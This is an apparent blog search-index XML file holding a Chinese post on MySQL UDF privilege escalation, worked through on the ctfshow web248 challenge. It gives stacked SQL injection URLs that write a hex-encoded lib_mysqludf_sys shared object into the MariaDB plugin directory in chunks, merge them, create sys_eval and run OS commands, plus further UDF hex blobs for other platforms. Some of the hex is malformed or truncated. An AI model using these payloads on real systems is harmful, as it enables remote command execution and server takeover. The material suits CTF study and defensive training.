<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>UDF提权</title>
    <link href="/2025/01/10/UDF%E6%8F%90%E6%9D%83/"/>
    <url>/2025/01/10/UDF%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h2 id="dxDHO">udf前置条件</h2><p>UDF（user defined function）用户自定义函数，是 mysql 的⼀个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在 sql 语句中调用，就像调用本机函数⼀样，win使用的是dll后缀，Linux使用的是so后缀</p><h3 id="FBKJQ">应用的一些条件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>.获取了MySQL的控制权，也就是知道MySQL账号和密码，并且能登录上去<br><span class="hljs-number">2</span>.mysql有写入文件的权限，即secure_file_priv的值为空，查询语句show <span class="hljs-keyword">global</span> variables like <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br><span class="hljs-number">3</span>.MySQL服务以root用户运行，如果是以普通用户运行的话，那么提权之后的权限也是普通用户的权限<br>查询用户权限select * <span class="hljs-keyword">from</span> mysql.user where user = <span class="hljs-title function_ invoke__">substring_index</span>(<span class="hljs-title function_ invoke__">user</span>(), <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-number">1</span>)\G;<br></code></pre></td></tr></table></figure><p><font style="color:#DF2A3F;">需要注意的一些条件</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">MySQL&gt;<span class="hljs-number">5.1</span>，扩展文件必须放在MySQL安装目录的lib\plugin文件夹下。（版本大于<span class="hljs-number">5.1</span>的时候，其中lib、plugin文件夹一般需要自己创建）<br><br>mysql版本&lt;<span class="hljs-number">5.1</span> 需要将扩展文件放在 C:\windows\或C:\windows\system32<br></code></pre></td></tr></table></figure><h3 id="llqQz">udf文件的获取</h3>有两种方法，首先得查询出udf文件所在，如下<p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1736433689115-d34427ef-20f2-4391-a057-1f0a8c829c87.png"></p><h4 id="mcV17">方法一：sqlmap获取</h4>sqlmap中的udf文件为了防止误杀进行了异或处理，需要利用sqlmap自带的解码脚本<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">python  /usr/share/sqlmap/extra/cloak/cloak.py -d -i  /usr/share/sqlmap/data/udf/mysql/windows/<span class="hljs-number">64</span>/lib_mysqludf_sys.dll_  -o lib_mysqludf_sys.dll<br></code></pre></td></tr></table></figure><h4 id="MojsD">方法二：从msf中获取</h4>`/usr/share/metasploit-framework/data/exploits/mysql`<p>直接cp出来就可以，不需要解码</p><h2 id="rObvm">具体利用</h2>我们需要将 UDF 的动态链接库文件（xxx.dll文件）放到 MySQL 的检索目录下才能创建自定义函数，对于不同版本的 mysql，检索目录是不同的：<p>得到udf文件后上传：<br>利用webshell上传（raven2）或者hex编码（ctfshow 248）上传</p><h3 id="kEcVi">ctfshow248</h3>我勒个豆，b哥还是b哥，甚至脚本都有，无敌我b神，附上链接[CTFSHOW-SQL注入 - Boogiepop Doesn’t Laugh](https://boogipop.com/2023/03/02/CTFSHOW-SQL%E6%B3%A8%E5%85%A5/#Web248-UDF%E6%B3%A8%E5%85%A5%EF%BC%89)<p>但是这里我们不用，我们只使用里面的一个获取udf文件的一个链接<a href="https://www.sqlsec.com/udf/">MySQL UDF 提权十六进制查询</a></p><p>现在我们先查询数据库的版本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/api/?id=<span class="hljs-number">0</span><span class="hljs-string">&#x27;;select version();%23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1736474219851-69b2c0af-2581-4ea3-a296-75f37e9dd3e2.png"></p><p>知道了大于5.1版本了，所以现在我们需要查<code>plugin</code>目录路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/api/?id=<span class="hljs-number">0</span><span class="hljs-string">&#x27;;select @@plugin_dir;%23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1736474315304-52186ab5-cf8b-4db9-9b54-094668cec19f.png"></p><p>所以目录的位置是<code>/usr/lib/mariadb/plugin/</code>，现在只需要上传我们的dll文件然后对他进行恶意函数的构造即可，这里我们选择<code>lib_mysqludf_sys_64.so</code>，<code>16进制</code>如下，记得把前面的<code>0x</code>去掉</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>但是<code>get传参</code>会有长度限制（URL 的最大长度是 2048 个字符），所以我们得分开传然后再合并，我肯定是不熟练，所以还得靠各位师傅的wp一步一步整了</p><p>先导入第一部分吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/api/?id=<span class="hljs-number">0</span><span class="hljs-string">&#x27;;select &#x27;</span><span class="hljs-number">7</span>f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803<span class="hljs-string">&#x27; into dumpfile &#x27;</span>/usr/lib/mariadb/plugin/<span class="hljs-number">1</span>.txt<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><p>查询看看导入没（后面查询写入步骤省略）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/api/?id=<span class="hljs-number">0</span><span class="hljs-string">&#x27;;select load_file(&#x27;</span>/usr/lib/mariadb/plugin/<span class="hljs-number">1</span>.txt<span class="hljs-string">&#x27;)%23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1736475642339-5b863444-368d-4c69-9865-fd381d6f9de8.png"></p><p>也是成功写入</p><p>继续写入第二第三部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">第二部分<br>/api/?id=<span class="hljs-number">0</span><span class="hljs-string">&#x27;;select &#x27;</span><span class="hljs-number">000000e9</span>b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e<span class="hljs-string">&#x27; into dumpfile &#x27;</span>/usr/lib/mariadb/plugin/<span class="hljs-number">2</span>.txt<span class="hljs-string">&#x27;%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">第三部分</span><br><span class="hljs-string">/api/?id=0&#x27;</span>;select <span class="hljs-string">&#x27;332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000&#x27;</span> into dumpfile <span class="hljs-string">&#x27;/usr/lib/mariadb/plugin/3.txt&#x27;</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>最后要合并三个文件作为一个<code>unjoke.so</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/api/?id=<span class="hljs-number">0</span><span class="hljs-string">&#x27;;select unhex(concat(load_file(&#x27;</span>/usr/lib/mariadb/plugin/<span class="hljs-number">1</span>.txt<span class="hljs-string">&#x27;),load_file(&#x27;</span>/usr/lib/mariadb/plugin/<span class="hljs-number">2</span>.txt<span class="hljs-string">&#x27;),load_file(&#x27;</span>/usr/lib/mariadb/plugin/<span class="hljs-number">3</span>.txt<span class="hljs-string">&#x27;))) into dumpfile &#x27;</span>/usr/lib/mariadb/plugin/unjoke.so<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><p>然后我们就需要创建一个函数（函数名别乱改，别问我怎么知道的），用于后续的命令执行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/api/?id=<span class="hljs-number">0</span><span class="hljs-string">&#x27;;create function sys_eval returns string soname &#x27;</span>unjoke.so<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/api/?id=<span class="hljs-number">0</span><span class="hljs-string">&#x27;;select sys_eval(&#x27;</span>ls /<span class="hljs-string">&#x27;)%23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1736476241372-18377d46-d9fe-474c-aab2-3d6bef9c6ee5.png"></p><h2 id="XuSs4">各种udf文件</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">SELECT <span class="hljs-number"></span> INTO DUMPFILE <span class="hljs-string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.3\\lib\\plugin\\udf.dll&#x27;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">SELECT <span class="hljs-number">span> INTO DUMPFILE <span class="hljs-string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.3\\lib\\plugin\\udf.dll&#x27;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">SELECT <span class="hljs-number">0x7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c326030